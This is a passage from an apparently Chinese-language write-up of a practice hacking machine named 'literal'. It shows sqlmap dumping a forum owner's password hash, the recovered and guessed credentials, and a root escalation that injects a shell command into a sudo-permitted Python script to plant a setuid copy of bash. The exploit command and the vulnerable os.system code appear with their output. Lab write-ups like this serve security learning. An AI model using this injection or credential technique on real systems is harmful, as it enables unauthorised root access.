[06:18:20] [INFO] using suffix '*'                             
[06:18:27] [INFO] using suffix '!!'                            
[06:18:34] [INFO] using suffix '?'                             
[06:18:40] [INFO] using suffix ';'                             
[06:18:47] [INFO] using suffix '..'                            
[06:18:53] [INFO] using suffix '!!!'                           
[06:19:01] [INFO] using suffix ', '                            
[06:19:08] [INFO] using suffix '@'                             
[06:19:15] [WARNING] no clear password(s) found                
Database: forumtesting
Table: forum_owner
[1 entry]
+----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+
| id | email                           | created    | password                                                                                                                         | username |
+----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+
| 1  | carlos@forumtesting.literal.htb | 2022-02-12 | 6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99 | carlos   |
+----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+

[06:19:15] [INFO] table 'forumtesting.forum_owner' dumped to CSV file '/home/kali/.local/share/sqlmap/output/forumtesting.literal.hmv/dump/forumtesting/forum_owner.csv'                        
[06:19:15] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/forumtesting.literal.hmv'      

[*] ending @ 06:19:15 /2025-09-07/
```

破解得到：carlos:forum100889，但是却登录失败，看了大佬的博客才知道这个联系着社工，因为网站是forumtesting，所以是forum100889，因此，ssh密码应该是ssh100889

# 权限提升

看一下哪里可能提权

```
carlos@literal:~$ sudo -l
Matching Defaults entries for carlos on literal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on literal:
    (root) NOPASSWD:
        /opt/my_things/blog/update_project_status.py *
carlos@literal:~$ cat /opt/my_things/blog/update_project_status.py
#!/usr/bin/python3

# Learning python3 to update my project status
## (mental note: This is important, so administrator is my safe to avoid upgrading records by mistake) :P

'''
References:
* MySQL commands in Linux: https://www.shellhacks.com/mysql-run-query-bash-script-linux-command-line/
* Shell commands in Python: https://stackabuse.com/executing-shell-commands-with-python/
* Functions: https://www.tutorialspoint.com/python3/python_functions.htm
* Arguments: https://www.knowledgehut.com/blog/programming/sys-argv-python-examples
* Array validation: https://stackoverflow.com/questions/7571635/fastest-way-to-check-if-a-value-exists-in-a-list
* Valid if root is running the script: https://stackoverflow.com/questions/2806897/what-is-the-best-way-for-checking-if-the-user-of-a-script-has-root-like-privileg
'''

import os
import sys
from datetime import date

# Functions ------------------------------------------------.
def execute_query(sql):
    os.system("mysql -u " + db_user + " -D " + db_name + " -e \"" + sql + "\"")

# Query all rows
def query_all():
    sql = "SELECT * FROM projects;"
    execute_query(sql)

# Query row by ID
def query_by_id(arg_project_id):
    sql = "SELECT * FROM projects WHERE proid = " + arg_project_id + ";"
    execute_query(sql)

# Update database
def update_status(enddate, arg_project_id, arg_project_status):
    if enddate != 0:
        sql = f"UPDATE projects SET prodateend = '" + str(enddate) + "', prostatus = '" + arg_project_status + "' WHERE proid = '" + arg_project_id + "';"
    else:
        sql = f"UPDATE projects SET prodateend = '2222-12-12', prostatus = '" + arg_project_status + "' WHERE proid = '" + arg_project_id + "';"

    execute_query(sql)

# Main program
def main():
    # Fast validation
    try:
        arg_project_id = sys.argv[1]
    except:
        arg_project_id = ""

    try:
        arg_project_status = sys.argv[2]
    except:
        arg_project_status = ""

    if arg_project_id and arg_project_status: # To update
        # Avoid update by error
        if os.geteuid() == 0:
            array_status = ["Done", "Doing", "To do"]
            if arg_project_status in array_status:
                print("[+] Before update project (" + arg_project_id + ")\n")
                query_by_id(arg_project_id)

                if arg_project_status == 'Done':
                    update_status(date.today(), arg_project_id, arg_project_status)
                else:
                    update_status(0, arg_project_id, arg_project_status)
            else:
                print("Bro, avoid a fail: Done - Doing - To do")
                exit(1)

            print("\n[+] New status of project (" + arg_project_id + ")\n")
            query_by_id(arg_project_id)
        else:
            print("Ejejeeey, avoid mistakes!")
            exit(1)

    elif arg_project_id:
        query_by_id(arg_project_id)
    else:
        query_all()

# Variables ------------------------------------------------.
db_user = "carlos"
db_name = "blog"

# Main program
main()
```

这里sql是直接拼接字符串，然后丢给os.system()执行，意味着我们可以在sql里闭合引号并拼接系统命令

```
def execute_query(sql):
    os.system("mysql -u " + db_user + " -D " + db_name + " -e \"" + sql + "\"")
```

提权

```
carlos@literal:~$ sudo /opt/my_things/blog/update_project_status.py '1"; cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash #' Done
[+] Before update project (1"; cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash #)

+-------+-----------------------------------------+---------------------+------------+-----------+
| proid | proname                                 | prodatecreated      | prodateend | prostatus |
+-------+-----------------------------------------+---------------------+------------+-----------+
|     1 | Ascii Art Python - ABCdario with colors | 2021-09-20 17:51:59 | 2021-09-20 | Done      |
+-------+-----------------------------------------+---------------------+------------+-----------+
ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1' at line 1

[+] New status of project (1"; cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash #)

+-------+-----------------------------------------+---------------------+------------+-----------+
| proid | proname                                 | prodatecreated      | prodateend | prostatus |
+-------+-----------------------------------------+---------------------+------------+-----------+
|     1 | Ascii Art Python - ABCdario with colors | 2021-09-20 17:51:59 | 2021-09-20 | Done      |
+-------+-----------------------------------------+---------------------+------------+-----------+
carlos@literal:~$ /tmp/rootbash -p
rootbash-5.0# id
uid=1000(carlos) gid=1000(carlos) euid=0(root) egid=0(root) groups=0(root),1000(carlos)
```
